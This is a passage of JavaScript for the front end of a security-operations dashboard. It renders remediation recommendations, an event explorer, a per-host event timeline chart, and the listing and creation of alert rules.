  if (explorer) explorer.scrollIntoView({behavior: 'smooth', block: 'start'});
}

let _openRunbookId = null;

async function loadActions() {
  const el = document.getElementById('actions-content');
  const d = await fetchJSON('/api/actions');
  const actions = d.actions || [];
  if (!actions.length) { el.innerHTML = '<div class="empty">No recommendations yet. TinySocs will suggest guided responses when alerts fire.</div>'; return; }

  let html = '';
  for (const a of actions.slice(0, 20)) {
    const staged = a.staged_at ? timeAgo(a.staged_at) : '';
    const isOpen = _openRunbookId === a.action_id;
    const statusCls = a.status === 'staged' ? 'background:#e67e22;color:#fff'
      : a.status === 'acknowledged' ? 'background:#27ae60;color:#fff'
      : a.status === 'dismissed' ? 'background:#7f8c8d;color:#fff' : 'background:var(--border);color:var(--fg)';

    const ops = a.status === 'staged'
      ? `<button class="btn-sm" style="background:#27ae60;color:#fff;border:none;border-radius:4px;padding:3px 10px;cursor:pointer;font-size:11px" onclick="event.stopPropagation();acknowledgeAction('${a.action_id}')">Acknowledge</button> <button class="btn-sm" style="background:#7f8c8d;color:#fff;border:none;border-radius:4px;padding:3px 10px;cursor:pointer;font-size:11px" onclick="event.stopPropagation();dismissAction('${a.action_id}')">Dismiss</button>`
      : '';

    html += `<div style="border:1px solid var(--border);border-radius:8px;margin-bottom:8px;overflow:hidden">`;
    html += `<div style="display:flex;align-items:center;gap:10px;padding:10px 14px;cursor:pointer;background:${isOpen?'var(--bg)':'transparent'}" onclick="toggleRunbook('${a.action_id}')">`;
    html += `<span style="font-size:11px;padding:2px 8px;border-radius:4px;${statusCls}">${a.status.toUpperCase()}</span>`;
    html += `<code style="font-size:13px;font-weight:600">${a.action}</code>`;
    html += `<span style="color:var(--muted);font-size:12px;flex:1">${escapeHtml(a.params?.reason || Object.entries(a.params||{}).map(([k,v])=>k+'='+v).join(', '))}</span>`;
    html += `<span style="font-size:11px;color:var(--muted);white-space:nowrap">${staged}</span>`;
    html += `<span style="white-space:nowrap">${ops}</span>`;
    html += `</div>`;

    if (isOpen) {
      const runbook = a.runbook || [];
      const resolution = a.resolution || '';
      html += `<div style="padding:8px 14px 14px;border-top:1px solid var(--border);background:var(--bg)">`;
      if (runbook.length) {
        html += `<div style="font-size:12px;font-weight:600;color:var(--accent);margin-bottom:6px">Remediation Runbook</div>`;
        html += `<ol style="margin:0 0 0 18px;padding:0;font-size:12px;line-height:1.8;color:var(--fg)">`;
        for (const step of runbook) {
          html += `<li>${escapeHtml(step)}</li>`;
        }
        html += `</ol>`;
      }
      if (resolution) {
        html += `<div style="margin-top:8px;padding:6px 10px;background:var(--surface);border-radius:4px;font-size:12px;color:var(--muted)"><strong>Resolution:</strong> ${escapeHtml(resolution)}</div>`;
      }
      if (a.resolved_by) {
        html += `<div style="font-size:11px;color:var(--muted);margin-top:4px">Resolved by ${escapeHtml(a.resolved_by)} ${a.resolved_at ? '&mdash; ' + new Date(a.resolved_at).toLocaleString() : ''}</div>`;
      }
      html += `</div>`;
    }
    html += `</div>`;
  }
  el.innerHTML = html;
}

function toggleRunbook(actionId) {
  _openRunbookId = _openRunbookId === actionId ? null : actionId;
  loadActions();
}

async function acknowledgeAction(actionId) {
  if (!confirm('Acknowledge this recommendation? You will handle remediation manually using the runbook steps.')) return;
  try {
    const r = await fetch(BASE + '/api/actions/' + actionId + '/approve', {method: 'POST'});
    const d = await r.json();
    if (!d.ok) alert('Failed: ' + (d.error || 'unknown'));
  } catch(e) { alert('Error: ' + e.message); }
  loadActions();
}

async function dismissAction(actionId) {
  if (!confirm('Dismiss this recommendation? (false positive / not applicable)')) return;
  try {
    const r = await fetch(BASE + '/api/actions/' + actionId + '/reject', {method: 'POST'});
    const d = await r.json();
    if (!d.ok) alert('Failed: ' + (d.error || 'unknown'));
  } catch(e) { alert('Error: ' + e.message); }
  loadActions();
}

async function stageTestAction() {
  try {
    const r = await fetch(BASE + '/api/actions/test', {method: 'POST'});
    const d = await r.json();
    if (!d.ok) { alert('Failed: ' + (d.error || 'unknown')); return; }
    loadActions();
  } catch(e) { alert('Error: ' + e.message); }
}

let _schemaCache = {};
let _eventsCache = [];
let _eventsIdx = '';
let _eventsPage = 0;
let _eventsLive = false;
// Dynamic: fit rows to available card height. Recalculated on first render.
let _EVENTS_PER_PAGE = Math.max(8, Math.floor((window.innerHeight - 120 - 150) / 32));
let _eventsSortCol = 'timestamp';
let _eventsSortAsc = false;  // default: TIME descending
let _expandedEventRows = new Set();

function toggleEventsLive(on) { _eventsLive = on; }

function sortEventsBy(col) {
  if (_eventsSortCol === col) { _eventsSortAsc = !_eventsSortAsc; }
  else { _eventsSortCol = col; _eventsSortAsc = col !== 'timestamp'; }
  renderEvents();
}

function copyCell(ev) {
  const td = ev.target.closest('td');
  if (!td) return;
  const text = td.getAttribute('data-full') || td.textContent;
  navigator.clipboard.writeText(text).then(() => {
    const toast = document.createElement('div');
    toast.className = 'copy-toast';
    toast.textContent = 'Copied!';
    toast.style.left = ev.clientX + 'px';
    toast.style.top = (ev.clientY - 28) + 'px';
    document.body.appendChild(toast);
    setTimeout(() => toast.remove(), 1300);
  });
}

function toggleEventMsg(rowIdx) {
  if (_expandedEventRows.has(rowIdx)) _expandedEventRows.delete(rowIdx);
  else _expandedEventRows.add(rowIdx);
  renderEvents();
}

function ensureCardVisible(id) {
  const cardTabMap = {summary:'overview',timeline:'overview',detections:'overview',
    fleet:'fleet',explorer:'data',rules:'detections',compliance:'compliance',mitre:'compliance'};
  const targetTab = cardTabMap[id];
  if (targetTab && targetTab !== _activeTab) switchTab(targetTab);
}

async function loadEvents(background) {
  const el = document.getElementById('events-content');
  const q = document.getElementById('eventQuery').value;
  const idx = document.getElementById('eventIndex').value;
  const timeRange = document.getElementById('eventTimeRange').value;
  if (!background) el.innerHTML = '<div class="loading">Loading...</div>';
  let url = `${apiBase()}/events/recent?limit=200&index=${encodeURIComponent(idx)}&q=${encodeURIComponent(q)}`;
  if (timeRange) url += `&time_range=${encodeURIComponent(timeRange)}`;
  const d = await fetchJSON(url);
  if (d.error && !d.events?.length) { el.innerHTML = `<div class="empty">${d.error}</div>`; return; }

  _eventsCache = d.events || [];
  _eventsIdx = idx;
  if (!background) _eventsPage = 0;
  if (!_eventsCache.length) { el.innerHTML = '<div class="empty">No events found</div>'; return; }
  renderEvents();
}

function renderEvents() {
  const el = document.getElementById('events-content');
  const events = _eventsCache;
  const idx = _eventsIdx;

  // Client-side sort on current data
  const sortKey = _eventsSortCol;
  const sortDir = _eventsSortAsc ? 1 : -1;
  const sorted = [...events].sort((a, b) => {
    let va = a[sortKey] || '', vb = b[sortKey] || '';
    if (sortKey === 'timestamp') { va = new Date(va || 0).getTime(); vb = new Date(vb || 0).getTime(); }
    else if (sortKey === 'event_id') { va = parseInt(va) || 0; vb = parseInt(vb) || 0; }
    else { va = String(va).toLowerCase(); vb = String(vb).toLowerCase(); }
    return va < vb ? -sortDir : va > vb ? sortDir : 0;
  });

  // Pagination
  const totalItems = sorted.length;
  const totalPages = Math.ceil(totalItems / _EVENTS_PER_PAGE);
  if (_eventsPage >= totalPages) _eventsPage = totalPages - 1;
  if (_eventsPage < 0) _eventsPage = 0;
  const pageStart = _eventsPage * _EVENTS_PER_PAGE;
  const pageEvents = sorted.slice(pageStart, pageStart + _EVENTS_PER_PAGE);

  const isAlerts = idx.includes('alerts');
  const arrow = (col) => _eventsSortCol === col ? (_eventsSortAsc ? '<span class="sort-arrow">&#9650;</span>' : '<span class="sort-arrow">&#9660;</span>') : '';
  let html;
  if (isAlerts) {
    html = '<table><tr>'
      + `<th class="sortable" onclick="sortEventsBy('timestamp')">Time${arrow('timestamp')}</th>`
      + `<th class="sortable" onclick="sortEventsBy('host')">Host${arrow('host')}</th>`
      + `<th class="sortable" onclick="sortEventsBy('rule_name')">Rule${arrow('rule_name')}</th>`
      + `<th class="sortable" onclick="sortEventsBy('severity')">Severity${arrow('severity')}</th>`
      + `<th class="sortable" onclick="sortEventsBy('message')">Description${arrow('message')}</th>`
      + '</tr>';
  } else {
    html = '<table><tr>'
      + `<th class="sortable" onclick="sortEventsBy('timestamp')">Time${arrow('timestamp')}</th>`
      + `<th class="sortable" onclick="sortEventsBy('host')">Host${arrow('host')}</th>`
      + `<th class="sortable" onclick="sortEventsBy('channel')">Channel${arrow('channel')}</th>`
      + `<th class="sortable" onclick="sortEventsBy('event_id')">ID${arrow('event_id')}</th>`
      + `<th class="sortable" onclick="sortEventsBy('message')">Message${arrow('message')}</th>`
      + '</tr>';
  }
  for (let ri = 0; ri < pageEvents.length; ri++) {
    const e = pageEvents[ri];
    const globalIdx = pageStart + ri;
    const t = e.timestamp ? new Date(e.timestamp).toLocaleString() : '';
    const fullMsg = e.message || '';
    const isExpanded = _expandedEventRows.has(globalIdx);
    const msg = isExpanded ? escapeHtml(fullMsg) : escapeHtml(fullMsg.substring(0, 120)) + (fullMsg.length > 120 ? '...' : '');
    const hostLink = e.host ? `<a href="#" style="color:var(--accent);text-decoration:none" onclick="event.preventDefault();event.stopPropagation();openHostTimeline('${escapeHtml(e.host)}')">${escapeHtml(e.host)}</a>` : '';
    const expandedClass = isExpanded ? ' class="expanded"' : '';
    html += `<tr${expandedClass} onclick="copyCell(event)">`;
    html += `<td style="white-space:nowrap" data-full="${escapeHtml(t)}">${t}</td>`;
    html += `<td data-full="${escapeHtml(e.host || '')}">${hostLink}</td>`;
    html += `<td data-full="${escapeHtml(e.channel || '')}">${escapeHtml(e.channel || '')}</td>`;
    html += `<td data-full="${escapeHtml(String(e.event_id || ''))}">${escapeHtml(String(e.event_id || ''))}</td>`;
    html += `<td class="msg-cell" style="font-size:12px;color:var(--muted);${isExpanded ? '' : 'max-width:400px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;'}" data-full="${escapeHtml(fullMsg)}" onclick="event.stopPropagation();toggleEventMsg(${globalIdx})">${msg}</td>`;
    html += '</tr>';
  }
  html += '</table>';

  el.innerHTML = html;

  // Pager — rendered outside the scrollable table area
  let pagerEl = document.getElementById('events-pager');
  if (!pagerEl) {
    pagerEl = document.createElement('div');
    pagerEl.id = 'events-pager';
    pagerEl.className = 'pager';
    el.parentNode.appendChild(pagerEl);
  }
  if (totalPages > 1) {
    pagerEl.innerHTML = `<button onclick="eventsPagePrev()" ${_eventsPage === 0 ? 'disabled' : ''}>&laquo; Prev</button>`
      + `<span>Page ${_eventsPage + 1} of ${totalPages} (${totalItems} events)</span>`
      + `<button onclick="eventsPageNext()" ${_eventsPage >= totalPages - 1 ? 'disabled' : ''}>Next &raquo;</button>`;
    pagerEl.style.display = '';
  } else {
    pagerEl.style.display = 'none';
  }
}

function eventsPagePrev() { _eventsPage = Math.max(0, _eventsPage - 1); renderEvents(); }
function eventsPageNext() { _eventsPage++; renderEvents(); }

async function toggleSchema() {
  const panel = document.getElementById('schema-panel');
  if (panel.style.display !== 'none') { panel.style.display = 'none'; return; }

  // Fetch schema if not cached
  if (!_schemaCache._loaded) {
    panel.innerHTML = '<span style="color:var(--muted)">Loading schema...</span>';
    panel.style.display = 'block';
    try {
      const d = await fetchJSON('/api/indices');
      _schemaCache = d;
      _schemaCache._loaded = true;
    } catch(e) {
      panel.innerHTML = '<span style="color:var(--danger)">Failed to load schema</span>';
      return;
    }
  }

  const idx = document.getElementById('eventIndex').value;
  const indices = (_schemaCache.indices || []);
  const info = indices.find(i => i.pattern === idx);
  if (!info || info.error) {
    panel.innerHTML = `<span style="color:var(--danger)">No schema available for ${idx}</span>`;
    panel.style.display = 'block';
    return;
  }

  const fields = info.fields || {};
  const fieldCount = Object.keys(fields).length;
  let html = `<div style="margin-bottom:6px"><strong>${idx}</strong> \u2014 ${fieldCount} fields (timestamp: <code>${info.ts_field}</code>)</div>`;
  html += '<div style="column-count:3;column-gap:16px">';
  for (const [name, ftype] of Object.entries(fields)) {
    const typeColor = ftype === 'keyword' ? '#6ea8fe' : ftype === 'text' ? '#75b798' : ftype === 'long' || ftype === 'integer' ? '#e9a64a' : ftype === 'date' ? '#e07cc1' : 'var(--muted)';
    html += `<div style="white-space:nowrap;overflow:hidden;text-overflow:ellipsis" title="${name} (${ftype})"><code style="color:${typeColor}">${ftype}</code> <span>${name}</span></div>`;
  }
  html += '</div>';
  panel.innerHTML = html;
  panel.style.display = 'block';
}

function timeAgo(iso) {
  try {
    const ms = Date.now() - new Date(iso).getTime();
    const m = Math.floor(ms / 60000);
    if (m < 1) return 'just now';
    if (m < 60) return m + 'm ago';
    const h = Math.floor(m / 60);
    if (h < 24) return h + 'h ago';
    return Math.floor(h / 24) + 'd ago';
  } catch(e) { return iso; }
}

// ---- Host Event Timeline (inline stacked area chart) ----
let _hostTimelineHost = '';  // '' = fleet-wide, 'HOST' = single, 'H1,H2' = multi
const _channelColors = [
  '#4a90d9', '#e67e22', '#2ecc71', '#e74c3c', '#9b59b6',
  '#1abc9c', '#f1c40f', '#e84393', '#00cec9', '#fd79a8',
];

// ---- Host picker (custom multi-select dropdown) ----
let _hostPickerOpen = false;
let _hostPickerSelected = new Set();  // empty = all hosts

function toggleHostPicker() {
  const menu = document.getElementById('hostPickerMenu');
  _hostPickerOpen = !_hostPickerOpen;
  menu.classList.toggle('open', _hostPickerOpen);
}

// Close picker when clicking outside
document.addEventListener('click', function(e) {
  const wrap = document.getElementById('hostPickerWrap');
  if (wrap && !wrap.contains(e.target) && _hostPickerOpen) {
    _hostPickerOpen = false;
    document.getElementById('hostPickerMenu').classList.remove('open');
  }
});

function _buildHostPickerMenu() {
  const menu = document.getElementById('hostPickerMenu');
  if (!menu) return;
  let html = '';
  // "All Hosts" option
  const allChecked = _hostPickerSelected.size === 0;
  html += '<label class="host-picker-item" onclick="event.stopPropagation()"><input type="checkbox"' + (allChecked ? ' checked' : '') + ' onchange="_onPickerAllToggle(this.checked)"><span>All Hosts</span></label>';
  if (_fleetCache.length) html += '<div class="host-picker-divider"></div>';
  for (const h of _fleetCache) {
    const checked = _hostPickerSelected.has(h.hostname);
    html += '<label class="host-picker-item" onclick="event.stopPropagation()"><input type="checkbox" value="' + escapeHtml(h.hostname) + '"' + (checked ? ' checked' : '') + ' onchange="_onPickerHostToggle(this)"><span>' + escapeHtml(h.hostname) + '</span></label>';
  }
  menu.innerHTML = html;
}

function _onPickerAllToggle(checked) {
  if (checked) {
    _hostPickerSelected.clear();
    _buildHostPickerMenu();
    _applyPickerSelection();
  }
}

function _onPickerHostToggle(cb) {
  if (cb.checked) {
    _hostPickerSelected.add(cb.value);
  } else {
    _hostPickerSelected.delete(cb.value);
  }
  // If none remain, reset to "all"
  if (_hostPickerSelected.size === 0) {
    _hostPickerSelected.clear();
  }
  _buildHostPickerMenu();
  _applyPickerSelection();
}

function _applyPickerSelection() {
  const btn = document.getElementById('hostPickerBtn');
  const titleEl = document.getElementById('hostTimelineTitle');
  if (_hostPickerSelected.size === 0) {
    _hostTimelineHost = '';
    btn.textContent = 'All Hosts';
    titleEl.textContent = 'Event Flow';
  } else if (_hostPickerSelected.size === 1) {
    const name = [..._hostPickerSelected][0];
    _hostTimelineHost = name;
    btn.textContent = name;
    titleEl.textContent = name + ' \u2014 Event Flow';
  } else {
    const names = [..._hostPickerSelected];
    _hostTimelineHost = names.join(',');
    btn.textContent = names.length + ' hosts selected';
    titleEl.textContent = names.join(', ') + ' \u2014 Event Flow';
  }
  refreshHostTimeline();
}

function _updateTimelineFilterFromFleet() {
  // Rebuild picker menu when fleet data changes
  _buildHostPickerMenu();
}

function openHostTimeline(hostname) {
  if (_activeTab !== 'fleet') switchTab('fleet');
  _hostPickerSelected.clear();
  _hostPickerSelected.add(hostname);
  _buildHostPickerMenu();
  _applyPickerSelection();
  document.getElementById('hostTimelineCard').scrollIntoView({behavior: 'smooth', block: 'nearest'});
}

function resetTimelineToFleet() {
  _hostPickerSelected.clear();
  _buildHostPickerMenu();
  _applyPickerSelection();
}

async function refreshHostTimeline() {
  const el = document.getElementById('hostTimelineChart');
  const legendEl = document.getElementById('hostTimelineLegend');
  const hrs = document.getElementById('hostTimelineRange').value;
  el.innerHTML = '<div class="loading">Loading...</div>';
  legendEl.innerHTML = '';

  const d = await fetchJSON(`${apiBase()}/host/timeline?hostname=${encodeURIComponent(_hostTimelineHost)}&hours=${hrs}`);
  if (d.error && !d.buckets?.length) { el.innerHTML = `<div class="empty">${d.error}</div>`; return; }

  const buckets = d.buckets || [];
  if (!buckets.length) { el.innerHTML = '<div class="empty">No data</div>'; return; }

  // Collect all channels and assign colours
  const channels = d.channels || [];
  if (!channels.length) {
    // Fallback: collect from buckets
    const cs = new Set();
    buckets.forEach(b => Object.keys(b.channels || {}).forEach(c => cs.add(c)));
    channels.push(...[...cs].sort());
  }
  const chColor = {};
  channels.forEach((c, i) => { chColor[c] = _channelColors[i % _channelColors.length]; });

  // Compute stacked values for each bucket
  // stackedVals[i] = array of cumulative heights per channel (bottom to top)
  const stackedMax = buckets.map(b => {
    let cum = 0;
    return channels.map(c => { cum += (b.channels?.[c] || 0); return cum; });
  });
  const maxY = Math.max(1, ...stackedMax.map(s => s[s.length - 1] || 0));

  // SVG dimensions — use container height for responsive sizing
  const W = 900;
  const containerH = el.clientHeight || el.parentElement.clientHeight;
  const H = Math.max(220, containerH - 10);
  const pad = {top: 16, right: 16, bottom: 28, left: 46};
  const plotW = W - pad.left - pad.right;
  const plotH = H - pad.top - pad.bottom;
  const n = buckets.length;

  // Y-axis ticks
  const yTicks = [];
  const step = Math.max(1, Math.ceil(maxY / 4));
  for (let t = 0; t <= maxY; t += step) yTicks.push(t);
  if (yTicks[yTicks.length - 1] < maxY) yTicks.push(Math.ceil(maxY));

  let svg = `<svg viewBox="0 0 ${W} ${H}" style="width:100%;height:100%" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">`;

  // Grid lines + Y labels
  for (const t of yTicks) {
    const y = pad.top + plotH - (t / maxY) * plotH;
    svg += `<line x1="${pad.left}" y1="${y}" x2="${W-pad.right}" y2="${y}" stroke="var(--border)" stroke-width="0.5"/>`;
    svg += `<text x="${pad.left-6}" y="${y+3}" text-anchor="end" fill="var(--muted)" font-size="10">${t}</text>`;
  }

  // Draw stacked areas (bottom channel first, then stacked upward)
  for (let ci = channels.length - 1; ci >= 0; ci--) {
    const color = chColor[channels[ci]];
    // Upper edge: cumulative up to channel ci
    let upper = '';
    for (let i = 0; i < n; i++) {
      const x = pad.left + (i / Math.max(1, n - 1)) * plotW;
      const yVal = stackedMax[i][ci] || 0;
      const y = pad.top + plotH - (yVal / maxY) * plotH;
      upper += `${x},${y} `;
    }
    // Lower edge: cumulative up to channel ci-1 (or 0 if first)
    let lower = '';
    for (let i = n - 1; i >= 0; i--) {
      const x = pad.left + (i / Math.max(1, n - 1)) * plotW;
      const yVal = ci > 0 ? (stackedMax[i][ci - 1] || 0) : 0;
      const y = pad.top + plotH - (yVal / maxY) * plotH;
      lower += `${x},${y} `;
    }
    svg += `<polygon points="${upper}${lower}" fill="${color}" opacity="0.55"/>`;
    // Stroke along top edge for clarity
    svg += `<polyline points="${upper}" fill="none" stroke="${color}" stroke-width="1.2" opacity="0.8"/>`;
  }

  // X labels
  const labelEvery = Math.max(1, Math.floor(n / 10));
  for (let i = 0; i < n; i++) {
    if (i % labelEvery === 0 || i === n - 1) {
      const x = pad.left + (i / Math.max(1, n - 1)) * plotW;
      const lbl = buckets[i].time ? new Date(buckets[i].time).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'}) : '';
      svg += `<text x="${x}" y="${H - 4}" text-anchor="middle" fill="var(--muted)" font-size="10">${lbl}</text>`;
    }
  }

  // Baseline
  svg += `<line x1="${pad.left}" y1="${pad.top+plotH}" x2="${W-pad.right}" y2="${pad.top+plotH}" stroke="var(--border)" stroke-width="1"/>`;
  svg += '</svg>';

  // Stats line
  const total = buckets.reduce((s, b) => s + b.count, 0);
  const avg = Math.round(total / Math.max(1, n));
  svg += `<div style="font-size:11px;color:var(--muted);margin-top:6px;text-align:center">`;
  svg += `Total: <strong>${total.toLocaleString()}</strong> events | `;
  svg += `Avg: <strong>${avg}</strong>/interval | `;
  svg += `Peak: <strong>${Math.ceil(maxY)}</strong> | `;
  svg += `Interval: ${d.interval}`;
  svg += `</div>`;

  el.innerHTML = svg;

  // Legend
  let leg = '';
  channels.forEach(c => {
    const cTotal = buckets.reduce((s, b) => s + (b.channels?.[c] || 0), 0);
    leg += `<span style="display:inline-flex;align-items:center;gap:4px;color:var(--text)">`;
    leg += `<span style="width:10px;height:10px;border-radius:2px;background:${chColor[c]};display:inline-block"></span>`;
    leg += `${escapeHtml(c)} <span style="color:var(--muted)">(${cTotal.toLocaleString()})</span></span>`;
  });
  legendEl.innerHTML = leg;
}

// ---- Alert Rules Management ----
let _rulesCache = [];
let _openRuleIdx = -1;
let _rulesPage = 0;
// Dynamic: fit rules to viewport height (same pattern as Event Explorer / detections)
let _RULES_PER_PAGE = Math.max(5, Math.floor((window.innerHeight - 120 - 180) / 36));

async function loadRules() {
  const el = document.getElementById('rules-content');
  const d = await fetchJSON('/api/rules');
  if (d.error) { el.innerHTML = `<div class="error">${escapeHtml(d.error)}</div>`; return; }
  _rulesCache = d.rules || [];
  // Don't re-render if the builder or upload form is open — user is mid-edit
  const builderOpen = document.getElementById('ruleBuilder')?.style.display !== 'none';
  const uploadOpen = document.getElementById('ruleUpload')?.style.display !== 'none';
  if (builderOpen || uploadOpen) return;
  renderRules();
}

function renderRules() {
  const el = document.getElementById('rules-content');
  const filter = document.getElementById('rulesFilter').value;
  let rules = _rulesCache;

  // Apply filter
  if (filter === 'builtin') rules = rules.filter(r => r.source === 'built-in');
  else if (filter === 'custom') rules = rules.filter(r => r.source !== 'built-in');
  else if (filter === 'enabled') rules = rules.filter(r => r.enabled !== false);
  else if (filter === 'disabled') rules = rules.filter(r => r.enabled === false);

  if (!rules.length) {
    el.innerHTML = '<div class="empty">No rules match this filter</div>';
    return;
  }

  // Pagination
  const totalRules = rules.length;
  const totalPages = Math.ceil(totalRules / _RULES_PER_PAGE);
  if (_rulesPage >= totalPages) _rulesPage = totalPages - 1;
  if (_rulesPage < 0) _rulesPage = 0;
  const pageStart = _rulesPage * _RULES_PER_PAGE;
  const pageRules = rules.slice(pageStart, pageStart + _RULES_PER_PAGE);

  // Group the current page's rules by category
  const cats = {};
  for (const r of pageRules) {
    const cat = r.category || 'uncategorised';
    if (!cats[cat]) cats[cat] = [];
    cats[cat].push(r);
  }

  let html = '';
  const catOrder = ['auth','powershell','endpoint','identity','persistence','lateral','network','cloud','custom','uncategorised'];
  const sortedCats = Object.keys(cats).sort((a,b) => {
    const ia = catOrder.indexOf(a), ib = catOrder.indexOf(b);
    return (ia === -1 ? 99 : ia) - (ib === -1 ? 99 : ib);
  });

  for (const cat of sortedCats) {
    const catRules = cats[cat];
    html += `<div style="font-size:11px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:0.5px;margin:10px 0 4px 0;padding-top:6px;border-top:1px solid var(--border)">${escapeHtml(cat)} <span style="font-weight:400">(${catRules.length})</span></div>`;
    for (const r of catRules) {
      const idx = _rulesCache.indexOf(r);
      const isOpen = (idx === _openRuleIdx);
      const enabled = r.enabled !== false;
      const opacStyle = enabled ? '' : 'opacity:0.5;';
      const srcBadge = r.source === 'built-in'
        ? '<span style="font-size:9px;padding:1px 5px;border-radius:3px;background:#34495e;color:#bdc3c7;flex-shrink:0;min-width:52px;text-align:center;display:inline-block;box-sizing:border-box">BUILT-IN</span>'
        : `<span style="font-size:9px;padding:1px 5px;border-radius:3px;background:#8e44ad;color:#fff;flex-shrink:0;min-width:52px;text-align:center;display:inline-block;box-sizing:border-box">${escapeHtml(r.source || 'CUSTOM')}</span>`;
      const sevColors = {critical:'#e74c3c',high:'#e67e22',medium:'#f39c12',low:'#3498db',info:'#95a5a6'};
      const sevColor = sevColors[r.severity] || '#95a5a6';

      html += `<div class="rule-row" style="${opacStyle}">`;
      html += `<div class="rule-row-header" onclick="toggleRuleDetail(${idx})">`;
      html += srcBadge;
      html += `<span style="font-size:9px;padding:1px 5px;border-radius:3px;background:${sevColor};color:#fff;flex-shrink:0;min-width:48px;text-align:center;display:inline-block;box-sizing:border-box">${escapeHtml(r.severity || 'medium')}</span>`;
      html += `<span class="rule-id">${escapeHtml(r.id)}</span>`;
      html += `<span class="rule-desc">${escapeHtml(r.description || '')}</span>`;
      html += `<span class="rule-meta">threshold: ${r.threshold || 1}</span>`;
      if (!enabled) html += '<span class="rule-meta" style="color:#e74c3c">disabled</span>';
      html += '</div>';

      // Expandable detail
      html += `<div class="rule-detail${isOpen ? ' open' : ''}" id="rule-detail-${idx}">`;
      html += `<table style="width:100%;font-size:12px">`;
      html += `<tr><td style="width:100px;color:var(--muted)">Index</td><td><code>${escapeHtml(r.index || '')}</code></td></tr>`;
      html += `<tr><td style="color:var(--muted)">Group By</td><td><code>${escapeHtml((r.group_by||[]).join(', '))}</code></td></tr>`;
      html += `<tr><td style="color:var(--muted)">Threshold</td><td>${r.threshold || 1}</td></tr>`;
      html += `<tr><td style="color:var(--muted)">Time Field</td><td><code>${escapeHtml(r.time_field || '@timestamp')}</code></td></tr>`;
      html += '</table>';
      html += `<div style="margin-top:6px"><span style="font-size:11px;color:var(--muted)">KQL Query:</span></div>`;
      html += `<pre>${escapeHtml(r.kql || '')}</pre>`;

      // Actions
      html += '<div style="display:flex;gap:6px;margin-top:6px">';
      if (r.editable) {
        html += `<button onclick="event.stopPropagation();toggleCustomRule('${escapeHtml(r.id)}')" style="font-size:11px;padding:3px 10px;border-radius:4px;cursor:pointer;border:none;background:${enabled?'#e67e22':'#27ae60'};color:#fff">${enabled?'Disable':'Enable'}</button>`;
        html += `<button onclick="event.stopPropagation();deleteCustomRule('${escapeHtml(r.id)}')" style="font-size:11px;padding:3px 10px;border-radius:4px;cursor:pointer;border:none;background:#e74c3c;color:#fff">Delete</button>`;
      }
      // "Test in Explorer" button for all rules
      html += `<button onclick="event.stopPropagation();testRuleInExplorer(${idx})" style="font-size:11px;padding:3px 10px;border-radius:4px;cursor:pointer;border:none;background:var(--accent);color:#fff">Test in Explorer</button>`;
      html += '</div>';
      html += '</div>';
      html += '</div>';
    }
  }

  el.innerHTML = html;

  // Pager — must be a direct child of the card (flex sibling), not inside the scrollable content
  let rulesPager = document.getElementById('rules-pager');
  if (!rulesPager) {
    rulesPager = document.createElement('div');
    rulesPager.id = 'rules-pager';
    rulesPager.className = 'pager';
    // Append to the card element itself (grandparent of content), not the scrollable content div
    const card = el.closest('.card') || el.parentNode;
    card.appendChild(rulesPager);
  }
  if (totalPages > 1) {
    rulesPager.innerHTML = `<button onclick="rulesPagePrev()" ${_rulesPage === 0 ? 'disabled' : ''}>&laquo; Prev</button>`
      + `<span>Page ${_rulesPage + 1} of ${totalPages} (${totalRules} rules)</span>`
      + `<button onclick="rulesPageNext()" ${_rulesPage >= totalPages - 1 ? 'disabled' : ''}>Next &raquo;</button>`;
    rulesPager.style.display = '';
  } else {
    rulesPager.style.display = 'none';
  }
}

function rulesPagePrev() { _rulesPage = Math.max(0, _rulesPage - 1); _openRuleIdx = -1; renderRules(); }
function rulesPageNext() { _rulesPage++; _openRuleIdx = -1; renderRules(); }

function filterRules() { _rulesPage = 0; renderRules(); }

function toggleRuleDetail(idx) {
  _openRuleIdx = (_openRuleIdx === idx) ? -1 : idx;
  renderRules();
}

function toggleRuleBuilder() {
  const el = document.getElementById('ruleBuilder');
  el.style.display = el.style.display === 'none' ? '' : 'none';
  document.getElementById('ruleUpload').style.display = 'none';
}

function toggleRuleUpload() {
  const el = document.getElementById('ruleUpload');
  el.style.display = el.style.display === 'none' ? '' : 'none';
  document.getElementById('ruleBuilder').style.display = 'none';
}

async function createRule() {
  const id = document.getElementById('rb_id').value.trim();
  const desc = document.getElementById('rb_desc').value.trim();
  const kql = document.getElementById('rb_kql').value.trim();
  const sev = document.getElementById('rb_severity').value;
  const idx = document.getElementById('rb_index').value.trim();
  const thresh = parseInt(document.getElementById('rb_threshold').value) || 1;
  const cat = document.getElementById('rb_category').value;
  const gbRaw = document.getElementById('rb_groupby').value.trim();
  const gb = gbRaw ? gbRaw.split(',').map(s => s.trim()).filter(Boolean) : [];
  const msg = document.getElementById('ruleBuilderMsg');

  if (!id || !desc || !kql) {
    msg.style.display = '';
    msg.style.color = '#e74c3c';
    msg.textContent = 'Please fill in Rule ID, Description, and KQL Query.';
    return;
  }

  msg.style.display = '';
  msg.style.color = 'var(--muted)';
  msg.textContent = 'Validating KQL query...';

  const r = await fetch(BASE + '/api/rules', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({rule: {id, description: desc, kql, severity: sev, index: idx, threshold: thresh, category: cat, group_by: gb}})
  });
  const d = await r.json();
  if (d.error) {
    msg.style.display = '';
    msg.style.color = '#e74c3c';
    msg.innerHTML = escapeHtml(d.error) + (d.hint ? `<br><span style="font-size:11px;color:var(--muted)">${escapeHtml(d.hint)}</span>` : '');
  } else {
    msg.style.display = '';
    msg.style.color = '#27ae60';
    let successMsg = `Rule "${id}" created and enabled.`;
    if (d.warning) successMsg += `<br><span style="font-size:11px;color:#e67e22">\u26a0 ${escapeHtml(d.warning)}</span>`;
    msg.innerHTML = successMsg;
    // Clear form
    document.getElementById('rb_id').value = '';
    document.getElementById('rb_desc').value = '';
    document.getElementById('rb_kql').value = '';
    setTimeout(() => { toggleRuleBuilder(); msg.style.display = 'none'; }, 1500);
    loadRules();
  }
}

async function uploadRulePack() {
  const fileInput = document.getElementById('rulePackFile');
  const packName = document.getElementById('rulePackName').value.trim() || 'uploaded-pack';
  const msg = document.getElementById('ruleUploadMsg');

  if (!fileInput.files.length) {
    msg.style.display = '';
    msg.style.color = '#e74c3c';
    msg.textContent = 'Please select a file.';
    return;
  }

  const file = fileInput.files[0];
